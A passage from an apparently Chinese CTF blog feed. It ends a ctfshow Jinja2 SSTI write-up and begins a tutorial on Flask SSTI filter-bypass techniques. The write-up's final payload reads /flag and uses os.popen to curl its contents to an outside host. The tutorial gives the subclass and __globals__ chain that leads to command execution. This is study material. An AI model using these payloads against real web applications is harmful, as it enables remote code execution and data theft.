class="built_in">dict</span>(aaaaaaaaaa=a)|join|length%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> dayu=(()|select|string|<span class="built_in">list</span>).pop()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> space=(()|select|string|<span class="built_in">list</span>).pop(eeeee*ee)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(()|select|string|<span class="built_in">list</span>).pop(eee*eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> point=(config|string|<span class="built_in">list</span>).pop(eeeeeeeeee*ee*eeeeeeeeee-eeeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> maohao=(config|string|<span class="built_in">list</span>).pop(ee*eeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xiegang=(config|string|<span class="built_in">list</span>).pop(-eeeeeeee*eeeeeeee) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">globals</span>=(xhx,xhx,<span class="built_in">dict</span>(<span class="built_in">globals</span>=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> builtins=(xhx,xhx,<span class="built_in">dict</span>(builtins=z)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ohs=<span class="built_in">dict</span>(o=z,s=z)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">open</span>=(lipsum|attr(<span class="built_in">globals</span>)).get(builtins).<span class="built_in">open</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> result=<span class="built_in">open</span>((xiegang,<span class="built_in">dict</span>(flag=z)|join)|join).read() %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> curlcmd=(<span class="built_in">dict</span>(curl=z)|join,space,<span class="built_in">dict</span>(http=z)|join,maohao,xiegang,xiegang,eeeeeeee,point,e,eee,z,point,eee,eeee,point,eeeee,eee,maohao,eeeeeee,eeeeeee,eeeeeee,eeeeeee,xiegang,result)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shell=(lipsum|attr(<span class="built_in">globals</span>)).get(ohs).popen(curlcmd) %&#125;</span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692699535461-6fe5aca5-bfd2-406e-aef9-9ec52ed5e842.png" alt="img"></p><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>虽然这是一个老生常谈的题目 但是自己对payload不太理解 这次刷过之后 会好很多 不至于看不懂 冲就完了</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Flask SSTI简单学习</title>
      <link href="/post/c52c3ed.html"/>
      <url>/post/c52c3ed.html</url>
      
        <content type="html"><![CDATA[<p>Flask SSTI</p><span id="more"></span><h1 id="SSTI前置知识"><a href="#SSTI前置知识" class="headerlink" title="SSTI前置知识"></a>SSTI前置知识</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。</span><br><span class="line">&#123;&#123;&#125;&#125;用于将表达式打印到模板输出</span><br><span class="line">&#123;<span class="comment">##&#125;表示未包含在模板输出中的注释</span></span><br><span class="line"><span class="comment">##可以有和&#123;%%&#125;相同的效果</span></span><br></pre></td></tr></table></figure><p>了解一些python的魔术方法和内置类</p><h2 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h2><p>返回该对象所属的类 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__ <span class="comment">#&#x27;&#x27;里面是字符串类型</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt; <span class="comment">#()里面是元组类型</span></span><br></pre></td></tr></table></figure><h2 id="base-和-bases"><a href="#base-和-bases" class="headerlink" title="base__和__bases"></a><strong>base__和__bases</strong></h2><p>都是用于获取类的基类 基类也叫父类</p><p>但是base是以字符串形式 而bases以元组的形式返回一个类所直接集成的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line">//<span class="built_in">object</span>为<span class="built_in">str</span>的基类</span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><h2 id="mro"><a href="#mro" class="headerlink" title="mro"></a><strong>mro</strong></h2><p>返回解析方法调用的顺序</p><p>（当调用_mro_[1]或者-1时作用其实等同于_base_）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h2><p>获取类的所有子类</p><p>这里需要知道object是所有类的基类</p><p>所以object下子类是所有类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()</span><br><span class="line">可以获取到很多我们可以利用的类 然后通过[]索引下标来获取我们想要的类</span><br></pre></td></tr></table></figure><h2 id="init"><a href="#init" class="headerlink" title="init"></a><strong>init</strong></h2><p>所有可被当作模板导入的都包含__init__方法，通过此方法来调用__globals__方法</p><h2 id="globals"><a href="#globals" class="headerlink" title="globals"></a><strong>globals</strong></h2><p>该方法会以字典的形式返回当前位置的所有全局变量</p><p>所有函数都会有一个 <strong>globals</strong> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典</p><h2 id="builtins"><a href="#builtins" class="headerlink" title="builtins"></a><strong>builtins</strong></h2><h3 id="python2-中为-bulitins-和-bulitin"><a href="#python2-中为-bulitins-和-bulitin" class="headerlink" title="python2 中为__bulitins__和__bulitin__"></a>python2 中为__bulitins__和__bulitin__</h3><p><strong>builtins</strong> 实际上是一个指向或者说引用 <strong>builtin</strong> 的（有点类似于软链接）</p><p>这里 <strong>builtins</strong> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p><h3 id="python3中为-builtins-和builtins"><a href="#python3中为-builtins-和builtins" class="headerlink" title="python3中为__builtins__和builtins"></a>python3中为__builtins__和builtins</h3><p> builtins 代替的 <strong>builtin</strong></p><p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 dir(<strong>builtins</strong>) 可以查到。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692343076146-0d66b0c5-04a0-4eb6-8136-666e07389d06.png" alt="img"></p><h2 id="import"><a href="#import" class="headerlink" title="import()"></a><strong>import</strong>()</h2><p>该方法用于动态加载类和函数 如果一个模块经常变化就可以使用__import__()来动态载入 语法<code>__import__(模块名)</code></p><p>总体思路就是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到父类&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt; ---&gt; 寻找子类 ---&gt; 找关于命令执行或者文件操作的模块。</span><br></pre></td></tr></table></figure><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p>变量可以通过过滤器修改。过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数</p><p>可以链接多 个过滤器</p><p>一个过滤器的输出应用于下一个过滤器。</p><h2 id="attr"><a href="#attr" class="headerlink" title="attr()"></a>attr()</h2><p>用于获取对象的属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>|attr(<span class="string">&quot;__class__&quot;</span>)</span><br><span class="line">相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__</span><br></pre></td></tr></table></figure><p>常见于点号<code>.</code>被过滤，或者点号<code>.</code>和中括号<code>[]</code>都被过滤的情况</p><h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>简单理解就是格式化字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)  <span class="comment">#相当于__class__</span></span><br></pre></td></tr></table></figure><h2 id="first-last-random"><a href="#first-last-random" class="headerlink" title="first() last() random()"></a>first() last() random()</h2><p>返回第一个值 最后一个值或者随机 </p><p>随机的话需要我们跑个脚本就有几率获取到我们想要的内容了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()|first()</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()|last()</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;jinja2.ext._CommentFinder&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()|random()</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h2><p>字符串拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[[<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>]|join] 或者 <span class="string">&quot;&quot;</span>[(<span class="string">&#x27;__clas&#x27;</span>,<span class="string">&#x27;s__&#x27;</span>)|join]</span><br><span class="line">相当于</span><br><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure><h2 id="lower"><a href="#lower" class="headerlink" title="lower()"></a>lower()</h2><p>转化为小写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__CLASS__&quot;</span>|lower()]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="replace-reverse"><a href="#replace-reverse" class="headerlink" title="replace() reverse()"></a>replace() reverse()</h2><p>替换和反转还原回我们要用的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;__claee__&quot;</span>|replace(<span class="string">&quot;ee&quot;</span>,<span class="string">&quot;ss&quot;</span>) 构造出字符串 <span class="string">&quot;__class__&quot;</span></span><br><span class="line"><span class="string">&quot;__ssalc__&quot;</span>|reverse 构造出 <span class="string">&quot;__class__&quot;</span></span><br></pre></td></tr></table></figure><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>功能类似于python内置函数 str<br>有了这个的话我们可以把显示到浏览器中的值全部转换为字符串再通过下标引用，就可以构造出一些字符了，再通过拼接就能构成特定的字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;().__class__ </span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;(().__class__|string)[<span class="number">1</span>] <span class="comment">#注意这里要先()括起来然后再用下标调用</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure><h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>和之前的结合起来有大作用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;()|select|string</span><br><span class="line">&lt;generator <span class="built_in">object</span> select_or_reject at <span class="number">0x7fc7678cdf90</span>&gt;</span><br></pre></td></tr></table></figure><p>然后我们就可以切字符了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">15</span>]~</span><br><span class="line">(()|select|string)[<span class="number">20</span>]~</span><br><span class="line">(()|select|string)[<span class="number">6</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">18</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]~</span><br><span class="line">(()|select|string)[<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">得到字符串<span class="string">&quot;__class__&quot;</span></span><br></pre></td></tr></table></figure><h2 id="list"><a href="#list" class="headerlink" title="list"></a>list</h2><p>转换成列表</p><p>更多的用途是配合上面的string转换成列表，就可以调用列表里面的方法取字符了</p><p>其实更多的是可以用list的函数了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;()|select|string|<span class="built_in">list</span></span><br><span class="line">[<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>][<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;(()|select|string|<span class="built_in">list</span>)[<span class="number">1</span>]</span><br><span class="line">g</span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>除了标准的python语法使用点<code>.</code>外，还可以使用中括号<code>[]</code>来访问变量的属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__classs__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="拼接："><a href="#拼接：" class="headerlink" title="拼接："></a>拼接：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;__cla&quot;+&quot;ss__&quot;`其实不用加中间的加号也可以 直接`&quot;__cla&quot;&quot;ss__&quot;</span><br></pre></td></tr></table></figure><h2 id="反转"><a href="#反转" class="headerlink" title="反转"></a>反转</h2><p><code>&quot;__ssalc__&quot;[::-1]</code> 其实是python的切片</p><h2 id="ascii转换"><a href="#ascii转换" class="headerlink" title="ascii转换"></a>ascii转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;0:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">97</span>)=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)=<span class="string">&#x27;__class__&#x27;</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>[<span class="string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\x5f\x5fclass\x5f\x5f <span class="comment">#16进制 __class__</span></span><br><span class="line">&gt;&gt;&gt;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="在jinja2里面可以利用-进行拼接"><a href="#在jinja2里面可以利用-进行拼接" class="headerlink" title="在jinja2里面可以利用~进行拼接"></a>在jinja2里面可以利用~进行拼接</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="built_in">set</span> b=<span class="string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;<span class="string">&quot;&quot;</span>[a~b]&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="SSTI语句构造"><a href="#SSTI语句构造" class="headerlink" title="SSTI语句构造"></a>SSTI语句构造</h1><h2 id="首先就是要拿到当前类"><a href="#首先就是要拿到当前类" class="headerlink" title="首先就是要拿到当前类"></a>首先就是要拿到当前类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;().<span class="keyword">class</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="拿object"><a href="#拿object" class="headerlink" title="拿object"></a>拿object</h2><p>也就是需要object然后再从它的子类中找我们可以利用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>]&#125;&#125;</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="拿基类的子类"><a href="#拿基类的子类" class="headerlink" title="拿基类的子类"></a>拿基类的子类</h2><p>用<code>__subclasses__()</code>获取子类</p><p>大多数利用的是<code>os.wrap_close</code>这个类</p><p>然后就是来找我们想要的内容 调教gpt帮我们写一个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">format_content</span>(<span class="params">content</span>):</span><br><span class="line">    lines = content.split(<span class="string">&quot;,&quot;</span>)  <span class="comment"># 以逗号为分隔符将内容拆分成行</span></span><br><span class="line">    formatted_lines = [<span class="string">f&quot;<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>. <span class="subst">&#123;line.strip()&#125;</span>&quot;</span> <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines)]  <span class="comment"># 为每一行添加序号</span></span><br><span class="line">    formatted_content = <span class="string">&quot;\n&quot;</span>.join(formatted_lines)  <span class="comment"># 将格式化后的行重新组合成字符串</span></span><br><span class="line">    <span class="keyword">return</span> formatted_content</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;content.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    input_content = file.read()</span><br><span class="line"></span><br><span class="line">formatted_content = format_content(input_content)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;格式化后的内容:&quot;</span>) <span class="comment">#找到的序号需要-1 注意一下</span></span><br><span class="line"><span class="built_in">print</span>(formatted_content)</span><br></pre></td></tr></table></figure><p>只要将前后的<code>[]</code>删去 然后放到content.txt就能自动帮我们标上序号了 然后序号要-1 因为脚本是从1开始的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349329941-cb5af00f-68ae-4fa1-90cb-496a1cedb40d.png" alt="img"></p><h2 id="init-方法进行初始化类"><a href="#init-方法进行初始化类" class="headerlink" title="__init__方法进行初始化类"></a>__init__方法进行初始化类</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__&#125;&#125;</span><br><span class="line">&lt;function _wrap_close.__init__ at <span class="number">0x7f2ee6fb25e0</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="然后再调用-globals-获取到方法内以字典的形式返回的方法、属性"><a href="#然后再调用-globals-获取到方法内以字典的形式返回的方法、属性" class="headerlink" title="然后再调用__globals__获取到方法内以字典的形式返回的方法、属性"></a>然后再调用__globals__获取到方法内以字典的形式返回的方法、属性</h2><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692349601730-0a12bdff-7cdb-44f9-a0b4-5db308ab3cc9.png" alt="img"></p><p>现在用命令执行函数或者模块就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span 